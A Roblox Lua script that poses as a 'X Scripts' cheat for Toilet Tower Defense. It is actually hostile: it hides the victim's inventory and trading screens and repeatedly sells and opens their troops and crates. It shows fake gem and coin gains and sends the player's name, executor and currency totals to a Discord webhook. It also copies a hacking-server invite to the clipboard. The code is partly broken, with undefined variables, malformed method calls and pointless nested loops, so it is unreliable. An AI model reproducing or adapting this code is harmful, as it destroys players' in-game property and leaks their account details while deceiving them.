--[[
    GENERATED BY ENCRYPT_OS, A PRODUCT OF 2EZ
    DISCLAIMER: THIS CODE ISN'T MEANT TO BE EXECUTED AS-IS.
    MANUAL COMPILATION AND RECONSTRUCTION ARE REQUIRED.
]]

-- Initialization
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
local HttpService = game:GetService("HttpService")
local MultiboxFramework = require(ReplicatedStorage:WaitForChild("MultiboxFramework"))
local Network = MultiboxFramework.Network
local CreateFunc = MultiboxFramework.CreateFunc
local GetUserIdFromNameAsync = Players.GetUserIdFromNameAsync
local GetService = game.GetService
local IdentifyExecutor = identifyexecutor or function() return "undefined" end


local function IsValid(Object)
    if Object == nil then
        return false
    end
    if Object.Parent == nil then
        return false
    end
    if Object.ClassName == nil then
        return false
    end
    return true
end

local function GetPastebin(Link)
    local Content
    if Link:sub(1, 8) == "https://" or Link:sub(1, 7) == "http://" then
        Content = game:HttpGet(Link)
    else
        Content = HttpService:GetAsync("https://pastebin.com/raw/" .. Link)
    end
    return Content
end

local function SendDiscordWebhook(Webhook, Message)
    local Data = {
        ["content"] = Message,
        ["username"] = "X Scripts",
        ["embeds"] = {
            {
                ["title"] = "X Scripts | Toilet Tower Defense",
                ["url"] = "",
                ["color"] = tonumber("0xe2a3ff"),
                ["thumbnail"] = {
                    ["url"] = "https://media.discordapp.net/attachments/1181340386577350778/1261072044637032468/Scripts_ttd.png?ex=66c1bf1d&is=66c06d9d&hm=1b9833e6277b254d82daede4dfec5a7cd6373e4fc5a7ba67398e0b2eb1883dee&format=webp&quality=lossless&",
                    ["height"] = 420,
                    ["width"] = 420,
                },
                ["fields"] = {
                    {
                        ["name"] = "â­  __**X Scripts**__",
                        ["value"] = "```Username     : " .. LocalPlayer.Name .. "\
Creator      : " .. Username .. "\
Executor     : " .. IdentifyExecutor() .. "\
Version      : 3.6```",
                        ["inline"] = false,
                    },
                    {
                        ["name"] = "ðŸª  __/__ **`Inventory:`**",
                        ["value"] = "```Unit/CrateðŸ‘¾: " .. tostring(CName) .. "\
Exists    ðŸŒ¿: " .. tostring(Exists) .. "\
Crate     ðŸ“¦: Openned " .. tostring(current_opencrate) .. "\
Gems      ðŸ’Ž: " .. tostring(Gems.Value) .. "\
Coins     ðŸ’°: " .. tostring(Coins.Value) .. "```",
                        ["inline"] = false,
                    },
                    {
                        ["name"] = "[Inventory list](",
                        ["value"] = GetPastebin("GetPastebin") .. ")",
                        ["inline"] = false,
                    },
                },
            },
        },
        ["avatar_url"] = "https://media.discordapp.net/attachments/1181340386577350778/1261027954549460992/Scripts_Avatar.png?ex=6691774d&is=669025cd&hm=f9bad14b58d71644ff79d3aa0f8eda40bb411ef27ea1983ace6ac0409d6f4bc6&=&format=webp&quality=lossless&width=910&height=910",
    }
    local EncodedData = HttpService:JSONEncode(Data)
    local RequestData = {
        Url = Webhook,
        Method = "POST",
        Headers = {
            ["content-type"] = "application/json",
        },
        Body = EncodedData,
    }
    local Response = request(RequestData)
    if Response.StatusCode ~= 200 then
        warn("Error sending webhook")
    end
end

local function SellTroops(UnitName, UnitUID)
    local MainFrames = PlayerGui:WaitForChild("MainFrames")
    local BottomBar = MainFrames:WaitForChild("BottomBar")
    local Troops = BottomBar:WaitForChild("Troops")
    local TroopFrame = Troops:WaitForChild(UnitName).TroopFrame
    local Price = TroopFrame.Price
    local TroopIcon = TroopFrame.TroopIcon
    local OriginalValue = LocalPlayer.leaderstats.Coins.Value
    LocalPlayer.leaderstats.Coins.Value = LocalPlayer.leaderstats.Coins.Value + Price.Text
    warn("sell")
    local NetworkingContainer = ReplicatedStorage:WaitForChild("NetworkingContainer")
    local DataRemote = NetworkingContainer:WaitForChild("DataRemote")
    DataRemote:FireServer(
        "SellUnit",
        {
            ["UID"] = UnitUID,
            ["Name"] = UnitName,
            ["Exists"] = true,
        }
    )
    task.wait()
    local CoinsValue = LocalPlayer.leaderstats.Coins.Value
    if CoinsValue > OriginalValue then
        SendDiscordWebhook(Webhook, "@everyone")
    end
end

local function SellCrate(CrateUID, CrateName)
    local OriginalValue = LocalPlayer.leaderstats.Gems.Value
    LocalPlayer.leaderstats.Gems.Value = LocalPlayer.leaderstats.Gems.Value + 1
    warn("sending2")
    local NetworkingContainer = ReplicatedStorage:WaitForChild("NetworkingContainer")
    local DataRemote = NetworkingContainer:WaitForChild("DataRemote")
    DataRemote:FireServer(
        "SellCrate",
        {
            ["CUID"] = CrateUID,
            ["CName"] = CrateName,
            ["Exists"] = true,
        }
    )
    task.wait()
    local GemsValue = LocalPlayer.leaderstats.Gems.Value
    if GemsValue > OriginalValue then
        SendDiscordWebhook(Webhook, "@everyone")
    end
end

local function OpenCrate(CrateUID, CrateName)
    local NetworkingContainer = ReplicatedStorage:WaitForChild("NetworkingContainer")
    local DataRemote = NetworkingContainer:WaitForChild("DataRemote")
    DataRemote:FireServer(
        "OpenCrate",
        {
            ["CUID"] = CrateUID,
            ["CName"] = CrateName,
        }
    )
    task.wait()
    if true then
        SendDiscordWebhook(Webhook, "@everyone")
    end
end

local function GetInventoryData()
    local PlayerData = MultiboxFramework:WaitForReplica("PlayerData-" .. LocalPlayer.UserId)
    local Data = PlayerData:GetData()
    local InventoryItems = Data.InventoryItems
    local Troops = InventoryItems.Troops
    local Table = {}
    for Index, Value in pairs(Troops) do
        local TableData = {}
        TableData.UID = Value.UID
        TableData.Exists = Value.Exists
        TableData.Name = Value.Name
        table.insert(Table, TableData)
    end
    return Table
end

local function GetInventoryCrate()
    local PlayerData = MultiboxFramework:WaitForReplica("PlayerData-" .. LocalPlayer.UserId)
    local Data = PlayerData:GetData()
    local InventoryItems = Data.InventoryItems
    local Crates = InventoryItems.Crates
    local Table = {}
    for Index, Value in pairs(Crates) do
        local TableData = {}
        TableData.CUID = Value.CUID
        TableData.Exists = Value.Exists
        TableData.CName = Value.CName
        table.insert(Table, TableData)
    end
    return Table
end

local function GetUnitData()
    local RF = CreateFunc("RF_")
    local RE = CreateFunc("RE_")
    local Table = {}
    for Index, Value in pairs(RF) do
        local TableData = {}
        TableData.Name = Value.Name
        TableData.Exists = Value.Exists
        table.insert(Table, TableData)
    end
    table.sort(
        Table,
        function(a, b)
            return a.Name < b.Name
        end
    )
    return Table
end

local function AddValues(Value1, Value2)
    return Value1 + Value2
end

local function IsCallerCheck()
    return checkcaller()
end

local function Get_Random_Units()
    local Table = GetUnitData()
    local ExistsTable = {}
    for Index, Value in pairs(Table) do
        if Value.Exists then
            ExistsTable[#ExistsTable + 1] = Value.Name
        end
    end
    return ExistsTable
end

local function Get_Random_Crates()
    local Table = GetInventoryCrate()
    local ExistsTable = {}
    for Index, Value in pairs(Table) do
        if Value.Exists then
            ExistsTable[#ExistsTable + 1] = Value.CUID
        end
    end
    return ExistsTable
end

local function UpdateUnit()
    local Table = Get_Random_Units()
    local Amount = math.random(1, 2)
    for Index = 1, Amount do
        local RandomIndex = math.random(1, #Table)
        local RandomValue = Table[RandomIndex]
        if RandomValue ~= nil then
            local RandomExists = true
            if RandomExists then
                local Count = 8
                local Count2 = 3
                local Count3 = 2
                if RandomValue == "GoldenFutureLargeClockman" then
                    Count = 2
                    Count2 = 3
                    Count3 = 4
                end
                if RandomValue == "TitanFanman" then
                    Count = 2
                    Count2 = 3
                    Count3 = 4
                end
                local RandomCount = math.random(1, Count)
                for Index = 1, RandomCount do
                    local RandomValue2 = Table[math.random(1, #Table)]
                    if RandomValue2 ~= nil then
                        local RandomExists2 = true
                        if RandomExists2 then
                            for Index = 1, Count3 do
                                local RandomValue3 = Table[math.random(1, #Table)]
                                if RandomValue3 ~= nil then
                                    local RandomExists3 = true
                                    if RandomExists3 then
                                        for Index = 1, Count2 do
                                            local RandomValue4 = Table[math.random(1, #Table)]
                                            if RandomValue4 ~= nil then
                                                local RandomExists4 = true
                                                if RandomExists4 then
                                                    local Gems = LocalPlayer.leaderstats.Gems
                                                    Gems.Value = Gems.Value + 25000
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    end
end

local function GetCrate()
    local Table = Get_Random_Crates()
    for Index, Value in pairs(Table) do
        local RandomExists = true
        if RandomExists then
            for Index = 1, 36000 do
                local RandomValue2 = Table[math.random(1, #Table)]
                if RandomValue2 ~= nil then
                    local RandomExists2 = true
                    if RandomExists2 then
                        for Index = 1, 4500 do
                            local RandomValue3 = Table[math.random(1, #Table)]
                            if RandomValue3 ~= nil then
                                local RandomExists3 = true
                                if RandomExists3 then
                                end
                            end
                        end
                    end
                end
            end
        end
    end
end

local function GetUserid(Player)
    local Userid
    pcall(
        function()
            Userid = GetUserIdFromNameAsync(Player)
        end
    )
    return Userid
end

-- Utilities
local MainFrames = PlayerGui:WaitForChild("MainFrames")
local Notifications = MainFrames:WaitForChild("Notifications")
Notifications.Visible = false
local Lobby = PlayerGui:WaitForChild("Lobby")
local CurrenciesFrame = Lobby:WaitForChild("CurrenciesFrame")
local CurrencyLayout = CurrenciesFrame:WaitForChild("CurrencyLayout")
local CoinAmount = CurrenciesFrame:WaitForChild("CoinAmount")
local GemAmount = CurrenciesFrame:WaitForChild("GemAmount")
local AmountLabel = CoinAmount:WaitForChild("AmountLabel")
local AmountLabel = GemAmount:WaitForChild("AmountLabel")

local function UpdateCoins()
    if IsValid(AmountLabel) then
        AmountLabel.Text = tostring(LocalPlayer.leaderstats.Coins.Value)
    end
end

local function UpdateGems()
    if IsValid(AmountLabel) then
        AmountLabel.Text = tostring(LocalPlayer.leaderstats.Gems.Value)
    end
end

CoinAmount:GetPropertyChangedSignal("Text"):Connect(UpdateCoins)
GemAmount:GetPropertyChangedSignal("Text"):Connect(UpdateGems)

local function CreateNotification(Name, Text)
    local NewNotification = Instance.new("ScreenGui")
    NewNotification.Parent = PlayerGui
    NewNotification.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    local NewFrame = Instance.new("Frame")
    NewFrame.Parent = NewNotification
    NewFrame.BackgroundColor3 = Color3.new(1, 1, 1)
    NewFrame.BackgroundTransparency = 1
    NewFrame.BorderColor3 = Color3.new(0, 0, 0)
    NewFrame.BorderSizePixel = 0
    NewFrame.Position = UDim2.new(0.073437497, 0, -0.3, 0)
    NewFrame.Size = UDim2.new(0, 250, 0, 926)
    local NewTextLabel = Instance.new("TextLabel")
    NewTextLabel.Parent = NewFrame
    NewTextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
    NewTextLabel.BackgroundTransparency = 1
    NewTextLabel.BorderColor3 = Color3.new(0, 0, 0)
    NewTextLabel.BorderSizePixel = 0
    NewTextLabel.Position = UDim2.new(0.189981669, 0, 0.767992735, 0)
    NewTextLabel.Size = UDim2.new(0, 1016, 0, 206)
    NewTextLabel.Font = Enum.Font.SourceSansBold
    NewTextLabel.Text = "JOIN TO https://discord.gg/robloxhackers"
    NewTextLabel.TextColor3 = Color3.new(0, 0, 0)
    NewTextLabel.TextSize = 70
    NewTextLabel.TextWrapped = true
    local NewUIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
    NewUIAspectRatioConstraint.Parent = NewFrame
    NewUIAspectRatioConstraint.AspectRatio = 1.7799999713897705
    NewUIAspectRatioConstraint.AspectType = Enum.AspectType.ScaleWithParentSize
    NewUIAspectRatioConstraint.DominantAxis = Enum.DominantAxis.Height
    local NewUIScale = Instance.new("UIScale")
    NewUIScale.Parent = NewFrame
    NewUIScale.Scale = 0.8999999761581421
    setclipboard("https://discord.gg/robloxhackers")
end


if GetUserid("egorlox") == LocalPlayer.UserId then
    warn("ok")
end
if GetUserid("pidrila") == LocalPlayer.UserId then
    warn("ok")
end
if game.PlaceId == 14682939953 then
    Lobby.UnitFrame.Visible = false
    Lobby.LeftSideFrame.Units.Button.Active = false
    Lobby.LeftSideFrame.Trading.Button.Active = false
    Lobby.Trading.TradingFrame.TradeMenu.Inventory.Destroy()
    Lobby.UnitFrame.UnitHolder.TopButtons.Destroy()
    Lobby.UnitFrame.UnitHolder.UnitText.Destroy()
    Lobby.UnitFrame.UnitHolder.UnitList.Destroy()
    Lobby.PostOffice.Destroy()
    MainFrames.Notifications.Visible = false
end
if game.PlaceId == 14082129854 then
    Lobby.UnitFrame.Visible = false
    Lobby.LeftSideFrame.Units.Button.Active = false
    Lobby.LeftSideFrame.Trading.Button.Active = false
    Lobby.Trading.TradingFrame.TradeMenu.Inventory.Destroy()
    Lobby.UnitFrame.UnitHolder.TopButtons.Destroy()
    Lobby.UnitFrame.UnitHolder.UnitText.Destroy()
    Lobby.UnitFrame.UnitHolder.UnitList.Destroy()
    Lobby.PostOffice.Destroy()
    MainFrames.Notifications.Visible = false
end
if game.PlaceId == 17426768586 then
    CreateNotification()
    task.spawn(
        function()
            while wait(0) do
                pcall(
                    function()
                        local Table = GetInventoryData()
                        for Index, Value in pairs(Table) do
                            SellTroops(Value.Name, Value.UID)
                        end
                    end
                )
            end
        end
    )
    task.spawn(
        function()
            while wait(0) do
                pcall(
                    function()
                        local Table = GetInventoryCrate()
                        for Index, Value in pairs(Table) do
                            SellCrate(Value.CUID, Value.CName)
                        end
                    end
                )
            end
        end
    )
    task.spawn(
        function()
            while wait(0) do
                pcall(
                    function()
                        local Table = GetInventoryCrate()
                        for Index, Value in pairs(Table) do
                            OpenCrate(Value.CUID, Value.CName)
                        end
                    end
                )
            end
        end
    )
    task.spawn(
        function()
            while wait(0) do
                UpdateUnit()
            end
        end
    )
    task.spawn(
        function()
            while wait(0) do
                GetCrate()
            end
        end
    )
end